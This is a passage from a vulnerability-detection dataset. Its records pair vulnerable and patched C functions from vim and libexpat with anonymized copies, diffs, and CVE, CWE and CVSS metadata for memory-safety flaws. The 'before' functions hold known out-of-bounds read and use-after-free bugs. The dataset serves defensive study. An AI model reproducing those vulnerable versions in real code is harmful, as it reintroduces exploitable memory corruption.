		    if (tmp_ptr - ptr >= IOSIZE - len)
			tmp_ptr = ptr + IOSIZE - len - 1;
		    STRNCPY(IObuff + len, ptr, tmp_ptr - ptr);
		    len += (int)(tmp_ptr - ptr);
		    *cont_s_ipos = TRUE;
		}
		IObuff[len] = NUL;
		ptr = IObuff;
	    }
	    if (len == compl_length)
		return NULL;
	}
    }

    *match_len = len;
    return ptr;
}","static char_u *
ins_comp_get_next_word_or_line(
	buf_T	*VAR_0,		/* COMMENT_0 */
	pos_T	*VAR_1,		/* COMMENT_1 */
	int	*VAR_2,
	int	*VAR_3)		/* COMMENT_2 */
{
    char_u	*VAR_4;
    int		VAR_5;

    *VAR_2 = 0;
    VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum, FALSE) +
	VAR_1->col;
    if (ctrl_x_mode_line_or_eval())
    {
	if (compl_status_adding())
	{
	    if (VAR_1->lnum >= VAR_0->b_ml.ml_line_count)
		return NULL;
	    VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum + 1, FALSE);
	    if (!VAR_6)
		VAR_4 = skipwhite(VAR_4);
	}
	VAR_5 = (int)STRLEN(VAR_4);
    }
    else
    {
	char_u	*VAR_7 = VAR_4;

	if (compl_status_adding() && VAR_8 <= (int)STRLEN(VAR_7))
	{
	    VAR_7 += VAR_8;
	    /* COMMENT_3 */
	    if (vim_iswordp(VAR_7))
		return NULL;
	    /* COMMENT_4 */
	    VAR_7 = find_word_start(VAR_7);
	}
	/* COMMENT_5 */
	VAR_7 = find_word_end(VAR_7);
	VAR_5 = (int)(VAR_7 - VAR_4);

	if (compl_status_adding() && VAR_5 == VAR_8)
	{
	    if (VAR_1->lnum < VAR_0->b_ml.ml_line_count)
	    {
		/* COMMENT_6 */
		/* COMMENT_7 */
		/* COMMENT_8 */
		/* COMMENT_9 */
		/* COMMENT_10 */
		STRNCPY(VAR_9, VAR_4, VAR_5);
		VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum + 1, FALSE);
		VAR_7 = VAR_4 = skipwhite(VAR_4);
		/* COMMENT_4 */
		VAR_7 = find_word_start(VAR_7);
		/* COMMENT_11 */
		VAR_7 = find_word_end(VAR_7);
		if (VAR_7 > VAR_4)
		{
		    if (*VAR_4 != ')' && VAR_9[VAR_5 - 1] != VAR_10)
		    {
			if (VAR_9[VAR_5 - 1] != ' ')
			    VAR_9[VAR_5++] = ' ';
			/* COMMENT_12 */
			if (VAR_11
				&& (VAR_9[VAR_5 - 2] == '.'
				    || (vim_strchr(VAR_12, VAR_13)
					== NULL
					&& (VAR_9[VAR_5 - 2] == '?'
					    || VAR_9[VAR_5 - 2] == '!'))))
			    VAR_9[VAR_5++] = ' ';
		    }
		    /* COMMENT_13 */
		    if (VAR_7 - VAR_4 >= VAR_14 - VAR_5)
			VAR_7 = VAR_4 + VAR_14 - VAR_5 - 1;
		    STRNCPY(VAR_9 + VAR_5, VAR_4, VAR_7 - VAR_4);
		    VAR_5 += (int)(VAR_7 - VAR_4);
		    *VAR_3 = TRUE;
		}
		VAR_9[VAR_5] = VAR_15;
		VAR_4 = VAR_9;
	    }
	    if (VAR_5 == VAR_8)
		return NULL;
	}
    }

    *VAR_2 = VAR_5;
    return VAR_4;
}",vim/a6f9e300161f4cb54713da22f65b261595e8e614/insexpand.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -27,7 +27,7 @@
     {
 	char_u	*tmp_ptr = ptr;
 
-	if (compl_status_adding())
+	if (compl_status_adding() && compl_length <= (int)STRLEN(tmp_ptr))
 	{
 	    tmp_ptr += compl_length;
 	    // Skip if already inside a word.","{'deleted_lines': ['\tif (compl_status_adding())'], 'added_lines': ['\tif (compl_status_adding() && compl_length <= (int)STRLEN(tmp_ptr))']}",True,Heap-based Buffer Overflow in GitHub repository vim/vim prior to 9.0.0101.,7.8,HIGH,2,valid,2022-07-28T20:51:37Z,4
CVE-2022-2816,['CWE-125'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0212: invalid memory access when compiling :unlet

Problem:    Invalid memory access when compiling :unlet.
Solution:   Don't read past the end of the line.",dbdd16b62560413abcc3c8e893cc3010ccf31666,https://github.com/vim/vim/commit/dbdd16b62560413abcc3c8e893cc3010ccf31666,src/vim9cmds.c,check_vim9_unlet,"int
check_vim9_unlet(char_u *name)
{
if (name[1] != ':' || vim_strchr((char_u *)""gwtb"", *name) == NULL)
{
if (*name == 's' && !script_is_vim9())
return OK;
semsg(_(e_cannot_unlet_str), name);
return FAIL;
}
return OK;
}","int
check_vim9_unlet(char_u *VAR_0)
{
if (VAR_0[1] != ':' || vim_strchr((char_u *)""gwtb"", *VAR_0) == NULL)
{
if (*VAR_0 == 's' && !script_is_vim9())
return VAR_1;
semsg(_(VAR_2), VAR_0);
return VAR_3;
}
return VAR_1;
}",vim/dbdd16b62560413abcc3c8e893cc3010ccf31666/vim9cmds.c/vul/before/0.json,"int
check_vim9_unlet(char_u *name)
{
    if (*name == NUL)
    {
	semsg(_(e_argument_required_for_str), ""unlet"");
	return FAIL;
    }

    if (name[1] != ':' || vim_strchr((char_u *)""gwtb"", *name) == NULL)
    {
	// ""unlet s:var"" is allowed in legacy script.
	if (*name == 's' && !script_is_vim9())
	    return OK;
	semsg(_(e_cannot_unlet_str), name);
	return FAIL;
    }
    return OK;
}","int
check_vim9_unlet(char_u *VAR_0)
{
    if (*VAR_0 == VAR_1)
    {
	semsg(_(VAR_2), ""unlet"");
	return VAR_3;
    }

    if (VAR_0[1] != ':' || vim_strchr((char_u *)""gwtb"", *VAR_0) == NULL)
    {
	/* COMMENT_0 */
	if (*VAR_0 == 's' && !script_is_vim9())
	    return VAR_4;
	semsg(_(VAR_5), VAR_0);
	return VAR_3;
    }
    return VAR_4;
}",vim/dbdd16b62560413abcc3c8e893cc3010ccf31666/vim9cmds.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,6 +1,12 @@
 int
 check_vim9_unlet(char_u *name)
 {
+    if (*name == NUL)
+    {
+	semsg(_(e_argument_required_for_str), ""unlet"");
+	return FAIL;
+    }
+
     if (name[1] != ':' || vim_strchr((char_u *)""gwtb"", *name) == NULL)
     {
 	// ""unlet s:var"" is allowed in legacy script.","{'deleted_lines': [], 'added_lines': ['    if (*name == NUL)', '    {', '\tsemsg(_(e_argument_required_for_str), ""unlet"");', '\treturn FAIL;', '    }', '']}",True,Out-of-bounds Read in GitHub repository vim/vim prior to 9.0.0212.,7.8,HIGH,2,valid,2022-08-14T20:46:07Z,4
CVE-2022-40674,['CWE-416'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H,1,libexpat,"Ensure raw tagnames are safe exiting internalEntityParser

It is possible to concoct a situation in which parsing is
suspended while substituting in an internal entity, so that
XML_ResumeParser directly uses internalEntityProcessor as
its processor.  If the subsequent parse includes some unclosed
tags, this will return without calling storeRawNames to ensure
that the raw versions of the tag names are stored in memory other
than the parse buffer itself.  If the parse buffer is then changed
or reallocated (for example if processing a file line by line),
badness will ensue.

This patch ensures storeRawNames is always called when needed
after calling doContent.  The earlier call do doContent does
not need the same protection; it only deals with entity
substitution, which cannot leave unbalanced tags, and in any
case the raw names will be pointing into the stored entity
value not the parse buffer.",4a32da87e931ba54393d465bb77c40b5c33d343b,https://github.com/libexpat/libexpat/commit/4a32da87e931ba54393d465bb77c40b5c33d343b,expat/lib/xmlparse.c,internalEntityProcessor,"static enum XML_Error PTRCALL
internalEntityProcessor(XML_Parser parser, const char *s, const char *end,
const char **nextPtr) {
ENTITY *entity;
const char *textStart, *textEnd;
const char *next;
enum XML_Error result;
OPEN_INTERNAL_ENTITY *openEntity = parser->m_openInternalEntities;
if (! openEntity)
return XML_ERROR_UNEXPECTED_STATE;
entity = openEntity->entity;
textStart = ((const char *)entity->textPtr) + entity->processed;
textEnd = (const char *)(entity->textPtr + entity->textLen);
next = textStart;
#ifdef XML_DTD
if (entity->is_param) {
int tok
= XmlPrologTok(parser->m_internalEncoding, textStart, textEnd, &next);
result = doProlog(parser, parser->m_internalEncoding, textStart, textEnd,
tok, next, &next, XML_FALSE, XML_TRUE,
XML_ACCOUNT_ENTITY_EXPANSION);
} else
#endif 
result = doContent(parser, openEntity->startTagLevel,
parser->m_internalEncoding, textStart, textEnd, &next,
XML_FALSE, XML_ACCOUNT_ENTITY_EXPANSION);
if (result != XML_ERROR_NONE)
return result;
else if (textEnd != next
&& parser->m_parsingStatus.parsing == XML_SUSPENDED) {
entity->processed = (int)(next - (const char *)entity->textPtr);
return result;
} else {
#ifdef XML_DTD
entityTrackingOnClose(parser, entity, __LINE__);
#endif
entity->open = XML_FALSE;
parser->m_openInternalEntities = openEntity->next;
openEntity->next = parser->m_freeInternalEntities;
parser->m_freeInternalEntities = openEntity;
}
#ifdef XML_DTD
if (entity->is_param) {
int tok;
parser->m_processor = prologProcessor;
tok = XmlPrologTok(parser->m_encoding, s, end, &next);
return doProlog(parser, parser->m_encoding, s, end, tok, next, nextPtr,
(XML_Bool)! parser->m_parsingStatus.finalBuffer, XML_TRUE,
XML_ACCOUNT_DIRECT);
} else
#endif 
{
parser->m_processor = contentProcessor;
return doContent(parser, parser->m_parentParser ? 1 : 0, parser->m_encoding,
s, end, nextPtr,
(XML_Bool)! parser->m_parsingStatus.finalBuffer,
XML_ACCOUNT_DIRECT);
}
}","static enum XML_Error VAR_0
internalEntityProcessor(XML_Parser VAR_1, const char *VAR_2, const char *VAR_3,
const char **VAR_4) {
ENTITY *VAR_5;
const char *VAR_6, *VAR_7;
const char *VAR_8;
enum XML_Error VAR_9;
OPEN_INTERNAL_ENTITY *VAR_10 = VAR_1->m_openInternalEntities;
if (! VAR_10)
return VAR_11;
VAR_5 = VAR_10->entity;
VAR_6 = ((const char *)VAR_5->textPtr) + VAR_5->processed;
VAR_7 = (const char *)(VAR_5->textPtr + VAR_5->textLen);
VAR_8 = VAR_6;
#ifdef VAR_12
if (VAR_5->is_param) {
int VAR_13
= XmlPrologTok(VAR_1->m_internalEncoding, VAR_6, VAR_7, &VAR_8);
VAR_9 = doProlog(VAR_1, VAR_1->m_internalEncoding, VAR_6, VAR_7,
VAR_13, VAR_8, &VAR_8, VAR_14, VAR_15,
VAR_16);
} else
#endif 
VAR_9 = doContent(VAR_1, VAR_10->startTagLevel,
VAR_1->m_internalEncoding, VAR_6, VAR_7, &VAR_8,
VAR_14, VAR_16);
if (VAR_9 != VAR_17)
return VAR_9;
else if (VAR_7 != VAR_8
&& VAR_1->m_parsingStatus.parsing == VAR_18) {
VAR_5->processed = (int)(VAR_8 - (const char *)VAR_5->textPtr);
return VAR_9;
} else {
#ifdef VAR_12
entityTrackingOnClose(VAR_1, VAR_5, VAR_19);
#endif
VAR_5->open = VAR_14;
VAR_1->m_openInternalEntities = VAR_10->next;
VAR_10->next = VAR_1->m_freeInternalEntities;
VAR_1->m_freeInternalEntities = VAR_10;
}
#ifdef VAR_12
if (VAR_5->is_param) {
int VAR_13;
VAR_1->m_processor = VAR_20;
VAR_13 = XmlPrologTok(VAR_1->m_encoding, VAR_2, VAR_3, &VAR_8);
return doProlog(VAR_1, VAR_1->m_encoding, VAR_2, VAR_3, VAR_13, VAR_8, VAR_4,
(XML_Bool)! VAR_1->m_parsingStatus.finalBuffer, VAR_15,
VAR_21);
} else
#endif 
{
VAR_1->m_processor = VAR_22;
return doContent(VAR_1, VAR_1->m_parentParser ? 1 : 0, VAR_1->m_encoding,
VAR_2, VAR_3, VAR_4,
(XML_Bool)! VAR_1->m_parsingStatus.finalBuffer,
VAR_21);
}
}",,"static enum XML_Error PTRCALL
internalEntityProcessor(XML_Parser parser, const char *s, const char *end,
                        const char **nextPtr) {
  ENTITY *entity;
  const char *textStart, *textEnd;
  const char *next;
  enum XML_Error result;
  OPEN_INTERNAL_ENTITY *openEntity = parser->m_openInternalEntities;
  if (! openEntity)
    return XML_ERROR_UNEXPECTED_STATE;

  entity = openEntity->entity;
  textStart = ((const char *)entity->textPtr) + entity->processed;
  textEnd = (const char *)(entity->textPtr + entity->textLen);
  /* Set a safe default value in case 'next' does not get set */
  next = textStart;

#ifdef XML_DTD
  if (entity->is_param) {
    int tok
        = XmlPrologTok(parser->m_internalEncoding, textStart, textEnd, &next);
    result = doProlog(parser, parser->m_internalEncoding, textStart, textEnd,
                      tok, next, &next, XML_FALSE, XML_TRUE,
                      XML_ACCOUNT_ENTITY_EXPANSION);
  } else
#endif /* XML_DTD */
    result = doContent(parser, openEntity->startTagLevel,
                       parser->m_internalEncoding, textStart, textEnd, &next,
                       XML_FALSE, XML_ACCOUNT_ENTITY_EXPANSION);

  if (result != XML_ERROR_NONE)
    return result;
  else if (textEnd != next
           && parser->m_parsingStatus.parsing == XML_SUSPENDED) {
    entity->processed = (int)(next - (const char *)entity->textPtr);
    return result;
  } else {
#ifdef XML_DTD
    entityTrackingOnClose(parser, entity, __LINE__);
#endif
    entity->open = XML_FALSE;
    parser->m_openInternalEntities = openEntity->next;
    /* put openEntity back in list of free instances */
    openEntity->next = parser->m_freeInternalEntities;
    parser->m_freeInternalEntities = openEntity;
  }

#ifdef XML_DTD
  if (entity->is_param) {
    int tok;
    parser->m_processor = prologProcessor;
    tok = XmlPrologTok(parser->m_encoding, s, end, &next);
    return doProlog(parser, parser->m_encoding, s, end, tok, next, nextPtr,
                    (XML_Bool)! parser->m_parsingStatus.finalBuffer, XML_TRUE,
                    XML_ACCOUNT_DIRECT);
  } else
#endif /* XML_DTD */
  {
    parser->m_processor = contentProcessor;
    /* see externalEntityContentProcessor vs contentProcessor */
    result = doContent(parser, parser->m_parentParser ? 1 : 0,
                       parser->m_encoding, s, end, nextPtr,
                       (XML_Bool)! parser->m_parsingStatus.finalBuffer,
                       XML_ACCOUNT_DIRECT);
    if (result == XML_ERROR_NONE) {
      if (! storeRawNames(parser))
        return XML_ERROR_NO_MEMORY;
    }
    return result;
  }
}","static enum XML_Error VAR_0
internalEntityProcessor(XML_Parser VAR_1, const char *VAR_2, const char *VAR_3,
                        const char **VAR_4) {
  ENTITY *VAR_5;
  const char *VAR_6, *VAR_7;
  const char *VAR_8;
  enum XML_Error VAR_9;
  OPEN_INTERNAL_ENTITY *VAR_10 = VAR_1->m_openInternalEntities;
  if (! VAR_10)
    return VAR_11;

  VAR_5 = VAR_10->entity;
  VAR_6 = ((const char *)VAR_5->textPtr) + VAR_5->processed;
  VAR_7 = (const char *)(VAR_5->textPtr + VAR_5->textLen);
  /* COMMENT_0 */
  VAR_8 = VAR_6;

#ifdef VAR_12
  if (VAR_5->is_param) {
    int VAR_13
        = XmlPrologTok(VAR_1->m_internalEncoding, VAR_6, VAR_7, &VAR_8);
    VAR_9 = doProlog(VAR_1, VAR_1->m_internalEncoding, VAR_6, VAR_7,
                      VAR_13, VAR_8, &VAR_8, VAR_14, VAR_15,
                      VAR_16);
  } else
#endif /* COMMENT_1 */
    VAR_9 = doContent(VAR_1, VAR_10->startTagLevel,
                       VAR_1->m_internalEncoding, VAR_6, VAR_7, &VAR_8,
                       VAR_14, VAR_16);

  if (VAR_9 != VAR_17)
    return VAR_9;
  else if (VAR_7 != VAR_8
           && VAR_1->m_parsingStatus.parsing == VAR_18) {
    VAR_5->processed = (int)(VAR_8 - (const char *)VAR_5->textPtr);
    return VAR_9;
  } else {
#ifdef VAR_12
    entityTrackingOnClose(VAR_1, VAR_5, VAR_19);
#endif
    VAR_5->open = VAR_14;
    VAR_1->m_openInternalEntities = VAR_10->next;
    /* COMMENT_2 */
    VAR_10->next = VAR_1->m_freeInternalEntities;
    VAR_1->m_freeInternalEntities = VAR_10;
  }

#ifdef VAR_12
  if (VAR_5->is_param) {
    int VAR_13;
    VAR_1->m_processor = VAR_20;
    VAR_13 = XmlPrologTok(VAR_1->m_encoding, VAR_2, VAR_3, &VAR_8);
    return doProlog(VAR_1, VAR_1->m_encoding, VAR_2, VAR_3, VAR_13, VAR_8, VAR_4,
                    (XML_Bool)! VAR_1->m_parsingStatus.finalBuffer, VAR_15,
                    VAR_21);
  } else
#endif /* COMMENT_1 */
  {
    VAR_1->m_processor = VAR_22;
    /* COMMENT_3 */
    VAR_9 = doContent(VAR_1, VAR_1->m_parentParser ? 1 : 0,
                       VAR_1->m_encoding, VAR_2, VAR_3, VAR_4,
                       (XML_Bool)! VAR_1->m_parsingStatus.finalBuffer,
                       VAR_21);
    if (VAR_9 == VAR_17) {
      if (! storeRawNames(VAR_1))
        return VAR_23;
    }
    return VAR_9;
  }
}",,"--- func_before
+++ func_after
@@ -58,9 +58,14 @@
   {
     parser->m_processor = contentProcessor;
     /* see externalEntityContentProcessor vs contentProcessor */
-    return doContent(parser, parser->m_parentParser ? 1 : 0, parser->m_encoding,
-                     s, end, nextPtr,
-                     (XML_Bool)! parser->m_parsingStatus.finalBuffer,
-                     XML_ACCOUNT_DIRECT);
+    result = doContent(parser, parser->m_parentParser ? 1 : 0,
+                       parser->m_encoding, s, end, nextPtr,
+                       (XML_Bool)! parser->m_parsingStatus.finalBuffer,
+                       XML_ACCOUNT_DIRECT);
+    if (result == XML_ERROR_NONE) {
+      if (! storeRawNames(parser))
+        return XML_ERROR_NO_MEMORY;
+    }
+    return result;
   }
 }","{'deleted_lines': ['    return doContent(parser, parser->m_parentParser ? 1 : 0, parser->m_encoding,', '                     s, end, nextPtr,', '                     (XML_Bool)! parser->m_parsingStatus.finalBuffer,', '                     XML_ACCOUNT_DIRECT);'], 'added_lines': ['    result = doContent(parser, parser->m_parentParser ? 1 : 0,', '                       parser->m_encoding, s, end, nextPtr,', '                       (XML_Bool)! parser->m_parsingStatus.finalBuffer,', '                       XML_ACCOUNT_DIRECT);', '    if (result == XML_ERROR_NONE) {', '      if (! storeRawNames(parser))', '        return XML_ERROR_NO_MEMORY;', '    }', '    return result;']}",True,libexpat before 2.4.9 has a use-after-free in the doContent function in xmlparse.c.,8.1,HIGH,2,valid,2022-08-17T17:26:18Z,4
CVE-2022-2889,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0225: using freed memory with multiple line breaks in expression

Problem:    Using freed memory with multiple line breaks in expression.
Solution:   Free eval_tofree later.",91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,https://github.com/vim/vim/commit/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,src/userfunc.c,get_lambda_tv,"int
get_lambda_tv(
char_u    **arg,
typval_T    *rettv,
int    types_optional,
evalarg_T   *evalarg)
{
intevaluate = evalarg != NULL
&& (evalarg->eval_flags & EVAL_EVALUATE);
garray_Tnewargs;
garray_Tnewlines;
garray_T*pnewargs;
garray_Targtypes;
garray_Tdefault_args;
ufunc_T*fp = NULL;
partial_T   *pt = NULL;
intvarargs;
char_u*ret_type = NULL;
intret;
char_u*s;
char_u*start, *end;
int*old_eval_lavars = eval_lavars_used;
inteval_lavars = FALSE;
char_u*tofree1 = NULL;
char_u*tofree2 = NULL;
intequal_arrow = **arg == '(';
intwhite_error = FALSE;
intcalled_emsg_start = called_emsg;
intvim9script = in_vim9script();
longstart_lnum = SOURCING_LNUM;
if (equal_arrow && !vim9script)
return NOTDONE;
ga_init(&newargs);
ga_init(&newlines);
s = *arg + 1;
ret = get_function_args(&s, equal_arrow ? ')' : '-', NULL,
types_optional ? &argtypes : NULL, types_optional, evalarg,
NULL, &default_args, TRUE, NULL, NULL);
if (ret == FAIL || skip_arrow(s, equal_arrow, &ret_type, NULL) == NULL)
{
if (types_optional)
ga_clear_strings(&argtypes);
return called_emsg == called_emsg_start ? NOTDONE : FAIL;
}
if (evaluate)
pnewargs = &newargs;
else
pnewargs = NULL;
*arg += 1;
ret = get_function_args(arg, equal_arrow ? ')' : '-', pnewargs,
types_optional ? &argtypes : NULL, types_optional, evalarg,
&varargs, &default_args,
FALSE, NULL, NULL);
if (ret == FAIL
|| (s = skip_arrow(*arg, equal_arrow, &ret_type,
equal_arrow || vim9script ? &white_error : NULL)) == NULL)
{
if (types_optional)
ga_clear_strings(&argtypes);
ga_clear_strings(&newargs);
return white_error ? FAIL : NOTDONE;
}
*arg = s;
if (ret_type != NULL)
{
ret_type = vim_strsave(ret_type);
tofree2 = ret_type;
}
if (evaluate)
eval_lavars_used = &eval_lavars;
*arg = skipwhite_and_linebreak(*arg, evalarg);
if (equal_arrow && **arg == '{')
{
if (evalarg == NULL)
goto theend;
SOURCING_LNUM = start_lnum;  if (lambda_function_body(arg, rettv, evalarg, pnewargs,
types_optional ? &argtypes : NULL, varargs,
&default_args, ret_type) == FAIL)
goto errret;
goto theend;
}
if (default_args.ga_len > 0)
{
emsg(_(e_cannot_use_default_values_in_lambda));
goto errret;
}
start = *arg;
ret = skip_expr_concatenate(arg, &start, &end, evalarg);
if (ret == FAIL)
goto errret;
if (evalarg != NULL)
{
tofree1 = evalarg->eval_tofree;
evalarg->eval_tofree = NULL;
}
if (!equal_arrow)
{
*arg = skipwhite_and_linebreak(*arg, evalarg);
if (**arg != '}')
{
semsg(_(e_expected_right_curly_str), *arg);
goto errret;
}
++*arg;
}
if (evaluate)
{
int    len;
int    flags = FC_LAMBDA;
char_u    *p;
char_u    *line_end;
char_u    *name = get_lambda_name();
fp = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
if (fp == NULL)
goto errret;
fp->uf_def_status = UF_NOT_COMPILED;
pt = ALLOC_CLEAR_ONE(partial_T);
if (pt == NULL)
goto errret;
ga_init2(&newlines, sizeof(char_u *), 1);
if (ga_grow(&newlines, 1) == FAIL)
goto errret;
line_end = vim_strchr(start, '\n');
if (line_end == NULL || line_end > end)
line_end = end;
len = 7 + (int)(line_end - start) + 1;
p = alloc(len);
if (p == NULL)
goto errret;
((char_u **)(newlines.ga_data))[newlines.ga_len++] = p;
STRCPY(p, ""return "");
vim_strncpy(p + 7, start, line_end - start);
if (line_end != end)
{
while (*line_end == '\n')
{
if (ga_grow(&newlines, 1) == FAIL)
goto errret;
start = line_end + 1;
line_end = vim_strchr(start, '\n');
if (line_end == NULL)
line_end = end;
((char_u **)(newlines.ga_data))[newlines.ga_len++] =
vim_strnsave(start, line_end - start);
}
}
if (strstr((char *)p + 7, ""a:"") == NULL)
flags |= FC_NOARGS;
fp->uf_refcount = 1;
set_ufunc_name(fp, name);
fp->uf_args = newargs;
ga_init(&fp->uf_def_args);
if (types_optional)
{
if (parse_argument_types(fp, &argtypes,
vim9script && varargs) == FAIL)
goto errret;
if (ret_type != NULL)
{
fp->uf_ret_type = parse_type(&ret_type,
&fp->uf_type_list, TRUE);
if (fp->uf_ret_type == NULL)
goto errret;
}
else
fp->uf_ret_type = &t_unknown;
}
fp->uf_lines = newlines;
if (current_funccal != NULL && eval_lavars)
{
flags |= FC_CLOSURE;
if (register_closure(fp) == FAIL)
goto errret;
}
#ifdef FEAT_PROFILE
if (prof_def_func())
func_do_profile(fp);
#endif
if (sandbox)
flags |= FC_SANDBOX;
fp->uf_varargs = !vim9script || varargs;
fp->uf_flags = flags;
fp->uf_calls = 0;
fp->uf_script_ctx = current_sctx;
fp->uf_script_ctx.sc_lnum += start_lnum;
function_using_block_scopes(fp, evalarg->eval_cstack);
pt->pt_func = fp;
pt->pt_refcount = 1;
rettv->vval.v_partial = pt;
rettv->v_type = VAR_PARTIAL;
hash_add(&func_hashtab, UF2HIKEY(fp));
}
theend:
eval_lavars_used = old_eval_lavars;
if (evalarg != NULL && evalarg->eval_tofree == NULL)
evalarg->eval_tofree = tofree1;
else
vim_free(tofree1);
vim_free(tofree2);
if (types_optional)
ga_clear_strings(&argtypes);
return OK;
errret:
ga_clear_strings(&newargs);
ga_clear_strings(&newlines);
ga_clear_strings(&default_args);
if (types_optional)
{
ga_clear_strings(&argtypes);
if (fp != NULL)
vim_free(fp->uf_arg_types);
}
vim_free(fp);
vim_free(pt);
if (evalarg != NULL && evalarg->eval_tofree == NULL)
evalarg->eval_tofree = tofree1;
else
vim_free(tofree1);
vim_free(tofree2);
eval_lavars_used = old_eval_lavars;
return FAIL;
}","int
get_lambda_tv(
char_u    **VAR_0,
typval_T    *VAR_1,
int    VAR_2,
evalarg_T   *VAR_3)
{
intVAR_4 = VAR_3 != NULL
&& (VAR_3->eval_flags & VAR_5);
garray_TVAR_6;
garray_TVAR_7;
garray_T*VAR_8;
garray_TVAR_9;
garray_TVAR_10;
ufunc_T*VAR_11 = NULL;
partial_T   *VAR_12 = NULL;
intVAR_13;
char_u*VAR_14 = NULL;
intVAR_15;
char_u*VAR_16;
char_u*VAR_17, *VAR_18;
int*VAR_19 = VAR_20;
intVAR_21 = FALSE;
char_u*VAR_22 = NULL;
char_u*VAR_23 = NULL;
intVAR_24 = **VAR_0 == '(';
intVAR_25 = FALSE;
intVAR_26 = VAR_27;
intVAR_28 = in_vim9script();
longVAR_29 = VAR_30;
if (VAR_24 && !VAR_28)
return VAR_31;
ga_init(&VAR_6);
ga_init(&VAR_7);
VAR_16 = *VAR_0 + 1;
VAR_15 = get_function_args(&VAR_16, VAR_24 ? ')' : '-', NULL,
VAR_2 ? &VAR_9 : NULL, VAR_2, VAR_3,
NULL, &VAR_10, TRUE, NULL, NULL);
if (VAR_15 == VAR_32 || skip_arrow(VAR_16, VAR_24, &VAR_14, NULL) == NULL)
{
if (VAR_2)
ga_clear_strings(&VAR_9);
return VAR_27 == VAR_26 ? VAR_31 : VAR_32;
}
if (VAR_4)
VAR_8 = &VAR_6;
else
VAR_8 = NULL;
*VAR_0 += 1;
VAR_15 = get_function_args(VAR_0, VAR_24 ? ')' : '-', VAR_8,
VAR_2 ? &VAR_9 : NULL, VAR_2, VAR_3,
&VAR_13, &VAR_10,
FALSE, NULL, NULL);
if (VAR_15 == VAR_32
|| (VAR_16 = skip_arrow(*VAR_0, VAR_24, &VAR_14,
VAR_24 || VAR_28 ? &VAR_25 : NULL)) == NULL)
{
if (VAR_2)
ga_clear_strings(&VAR_9);
ga_clear_strings(&VAR_6);
return VAR_25 ? VAR_32 : VAR_31;
}
*VAR_0 = VAR_16;
if (VAR_14 != NULL)
{
VAR_14 = vim_strsave(VAR_14);
VAR_23 = VAR_14;
}
if (VAR_4)
VAR_20 = &VAR_21;
*VAR_0 = skipwhite_and_linebreak(*VAR_0, VAR_3);
if (VAR_24 && **VAR_0 == '{')
{
if (VAR_3 == NULL)
goto theend;
VAR_30 = VAR_29;  
if (lambda_function_body(VAR_0, VAR_1, VAR_3, VAR_8,
VAR_2 ? &VAR_9 : NULL, VAR_13,
&VAR_10, VAR_14) == VAR_32)
goto errret;
goto theend;
}
if (VAR_10.ga_len > 0)
{
emsg(_(VAR_33));
goto errret;
}
VAR_17 = *VAR_0;
VAR_15 = skip_expr_concatenate(VAR_0, &VAR_17, &VAR_18, VAR_3);
if (VAR_15 == VAR_32)
goto errret;
if (VAR_3 != NULL)
{
VAR_22 = VAR_3->eval_tofree;
VAR_3->eval_tofree = NULL;
}
if (!VAR_24)
{
*VAR_0 = skipwhite_and_linebreak(*VAR_0, VAR_3);
if (**VAR_0 != '}')
{
semsg(_(VAR_34), *VAR_0);
goto errret;
}
++*VAR_0;
}
if (VAR_4)
{
int    VAR_35;
int    VAR_36 = VAR_37;
char_u    *VAR_38;
char_u    *VAR_39;
char_u    *VAR_40 = get_lambda_name();
VAR_11 = alloc_clear(offsetof(ufunc_T, VAR_41) + STRLEN(VAR_40) + 1);
if (VAR_11 == NULL)
goto errret;
VAR_11->uf_def_status = VAR_42;
VAR_12 = ALLOC_CLEAR_ONE(partial_T);
if (VAR_12 == NULL)
goto errret;
ga_init2(&VAR_7, sizeof(char_u *), 1);
if (ga_grow(&VAR_7, 1) == VAR_32)
goto errret;
VAR_39 = vim_strchr(VAR_17, '\n');
if (VAR_39 == NULL || VAR_39 > VAR_18)
VAR_39 = VAR_18;
VAR_35 = 7 + (int)(VAR_39 - VAR_17) + 1;
VAR_38 = alloc(VAR_35);
if (VAR_38 == NULL)
goto errret;
((char_u **)(VAR_7.ga_data))[VAR_7.ga_len++] = VAR_38;
STRCPY(VAR_38, ""return "");
vim_strncpy(VAR_38 + 7, VAR_17, VAR_39 - VAR_17);
if (VAR_39 != VAR_18)
{
while (*VAR_39 == '\n')
{
if (ga_grow(&VAR_7, 1) == VAR_32)
goto errret;
VAR_17 = VAR_39 + 1;
VAR_39 = vim_strchr(VAR_17, '\n');
if (VAR_39 == NULL)
VAR_39 = VAR_18;
((char_u **)(VAR_7.ga_data))[VAR_7.ga_len++] =
vim_strnsave(VAR_17, VAR_39 - VAR_17);
}
}
if (strstr((char *)VAR_38 + 7, ""a:"") == NULL)
VAR_36 |= VAR_43;
VAR_11->uf_refcount = 1;
set_ufunc_name(VAR_11, VAR_40);
VAR_11->uf_args = VAR_6;
ga_init(&VAR_11->uf_def_args);
if (VAR_2)
{
if (parse_argument_types(VAR_11, &VAR_9,
VAR_28 && VAR_13) == VAR_32)
goto errret;
if (VAR_14 != NULL)
{
VAR_11->uf_ret_type = parse_type(&VAR_14,
&VAR_11->uf_type_list, TRUE);
if (VAR_11->uf_ret_type == NULL)
goto errret;
}
else
VAR_11->uf_ret_type = &VAR_44;
}
VAR_11->uf_lines = VAR_7;
if (VAR_45 != NULL && VAR_21)
{
VAR_36 |= VAR_46;
if (register_closure(VAR_11) == VAR_32)
goto errret;
}
#ifdef VAR_47
if (prof_def_func())
func_do_profile(VAR_11);
#endif
if (VAR_48)
VAR_36 |= VAR_49;
VAR_11->uf_varargs = !VAR_28 || VAR_13;
VAR_11->uf_flags = VAR_36;
VAR_11->uf_calls = 0;
VAR_11->uf_script_ctx = VAR_50;
VAR_11->uf_script_ctx.sc_lnum += VAR_29;
function_using_block_scopes(VAR_11, VAR_3->eval_cstack);
